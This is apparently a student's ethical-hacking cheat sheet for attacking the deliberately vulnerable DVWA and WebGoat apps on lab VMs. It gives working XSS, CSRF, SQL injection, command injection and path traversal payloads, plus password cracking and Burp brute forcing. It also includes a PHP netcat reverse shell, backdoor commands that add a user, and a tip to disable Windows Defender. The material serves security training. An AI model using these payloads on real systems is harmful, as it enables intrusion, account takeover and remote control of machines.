# EHD Cheat Sheet (Web Application)

###### tags: #EHD

## Table of Contents
```toc
```

## XSS
- Trigger alert in textbox input (Type into textbox)
```html
<script>alert("Hello!")</script>
```

- Redirect to another page (Type into textbox)
```html
<script>document.location="https://www.google.com"</script>
```

- If there is a maximum length limit for text input, inspect and modify the input element

![](https://i.imgur.com/e4sSKVf.png)

- Creating a fake form (type into textbox):
```html
<form>
Input1: <input type="text"><br>
Input2: <input type="text"><br>
<input type="submit" value="submit button">
</form>
```

## CSRF
- Create a CSRF page with the following contents:
- **Example 1:** Contains image with source to change credentials
```html
<!--
Comments:
- Replace Win10-IP with own Win10 VM IP Address
- Image source set to URI dusplayed when admin password is changed
-->
This is a very new web page
<img width="1" src="http://Win10-IP/dvwa-master/vulnerabilities/csrf/?password_new=12345678&password_conf=12345678&Change=Change">
```

- **Example 2:** Contains 1x1 small iframe to manipulate website data
```html
<iframe width="1" height="1" src="https://www.imdb.com/title/tt0803096"></iframe><br>
Good Day!
```

## Command Injection
- Type IP of other machines, followed by `&& dir c:\
- Directory listing of C drive in Win10 VM shown

## SQL Injection
- Basic injection command:
```sql
ppp' or '0' = '0
```

- Retrieve more columns from table:
```sql
ppp' or '0' = '0' union select column1, column2 from table --
```

- Retrieve `information_schema` from database
```sql
ppp' or '0' = '0' union select table_schema, table_name from information_schema.tables --
```

## John The Ripper
- Crack hashed passwords inside <u>password.txt</u>
```
sudo john password.txt
```

- Run John The Ripper with various suggested formats
```
sudo john --format=raw-md5 password.txt
```

## Forced Browsing
- Manipulate the value contained in `page=` to find hidden files
```
http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=file4.php
```

## File Inclusion
- Change URL below to get non-existent page and get error to find full path of page
```
http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=include2.php
```

- Find configuration file of Apache Web Server
```
http://Win-10/dvwa-master/vulnerabilities/fi/?page=..\..\..\..\apache\conf\httpd.conf
```

## Burp Suite
### Setting Up
- Launch Burp Suite
```
sudo burpsuite
```

- Browse to DVWA on Kali VM
```
http://192.168.10.100/dvwa-master
```

> Ensure that Windows Firewall not blocking access to DVWA (Add Exception Port 80 if needed)

- Configure proxy in Firefox browser

![](https://i.imgur.com/dN1y4gW.png)


- Go to **Proxy** tab and 

### Brute Force Password with Dictionary Lists
- Create new files and store list of usernames
- Create another new file with list of passwords
- Turn on Intercept in **Proxy** tab
- Login with credentials in DVWA
- Forward packets intercepted by Burp until username and password found
- Click **Action** -> **Send to Intruder** -> **Positions**
- Request sent with parameters highlighted
- Add username and password to get username and password payloads
- Set attack type to **cluster bomb**
- Set one payload for username and one payload for password
- Load username and password list in respective payloads
- Check **Store requests** and **Store responses**
- Start Attack
- View results in **Response** tab
- Find request with <u>correct</u> response

> Use **Grep -Match** and enter keyword to search in the **Add** textbox to find matching keywords from the results

## File Upload: Malicious Files 

![](https://i.imgur.com/poKARAw.png)

- To browse to uploaded file:
```
http://Win10-IP/dvwa-master/hackable/uploads/uploaded.file
```

### Backdoor
- List web shell languages:
```
ls /usr/share/webshells/
```

- Languages supported by DVWA:
```
sudo nmap -sV -p 80 <Win10-IP>
```

![](https://i.imgur.com/bdavvg8.png)

- List contents of `php` directory and make simple backdoor script and upload it to DVWA

![](https://i.imgur.com/kxDH0PZ.png)

> **Troubleshooting!**
> If script runs and gets removed, disable Windows Defender and upload the file and run it again!

- Backdoor can run commands from the URL

![](https://i.imgur.com/HJivVJH.png)
![](https://i.imgur.com/uIvJQqO.png)
```
cat /etc/passwd
net user secretuser 1q2w3e4r! /add
```

- Netcat Reverse Shell for Windows
```php
<?php
	header("Content-type: text/plain");
	$ip = "Kali-IP";  // Change to Kali IP
	$port = "443";    // Change to any port number not in use
	$cmd = "nc.exe -e cmd.exe ".$ip." ".$port;
	echo "\nExecuting : ".$cmd."\n";
	$output = system($cmd)
?>	
```

- Run Netcat on Kali to listen to port
```
sudo nc -l -p <port-number>
```

- Upload Netcat reverse shell and `nc.exe` on the file to DVWA file upload
- Browse to Reverse Shell
```
http://Win10-IP/dvwa-master/hackable/uploads/nc-reverse-shell.php
```

## WebGoat
- Default port: 8080
- Run command to change port of WebGoat:
```
java -jar webgoat-server-nnnn.jar --server.port=9090
```

- Configure the following proxy settings `about:config` in Firefox browser
![](https://i.imgur.com/H4UQAhV.png)

### Bypass Front-End Restrictions
- Connect browser to Burp Proxy and enable **Intercept** on Burp
- Forward packets until submitted form is found
	- Inputs can be modified below
![500](https://i.imgur.com/8h2pCRH.png)

### Authentication Bypass
- Intercept security questions with Burp and modify request such that security questions are always true
![550](https://i.imgur.com/jMtIc1F.png)
![](https://i.imgur.com/UNyKKBx.png)

### Insecure Direct Object Reference
 - Login as "Tom Cat"
 - View Profile
 - Intercept GET request with Burp
 - Forward packets until HTTP request for View Profile found
 - Click **Action** -> **Send to Repeater**
![](https://i.imgur.com/fJeXrey.png)

**Modify Another Profile**
- Forward until View Profile request found
- Replace `%7Buserid%7D` with another possible user ID value (trial and error)

### SQL Injection (WebGoat)
- Grant unauthorized user right to alter tables
```sql
grant alter table to UnauthorizedUser
```

## SQLMap
- Find request URL vulnerable to SQL injection and find its corresponding cookie value
- Run SQLmap on the following command:

```
sudo sqlmap -u "http//Win10-IP/dvwa-master/vulnerabilties/sqli/?id=3&Submit=Submit" --cookie="security=low;PHPSESSID=ab6iiicumjdbjkmun4cphkdmvo" --dbs
```
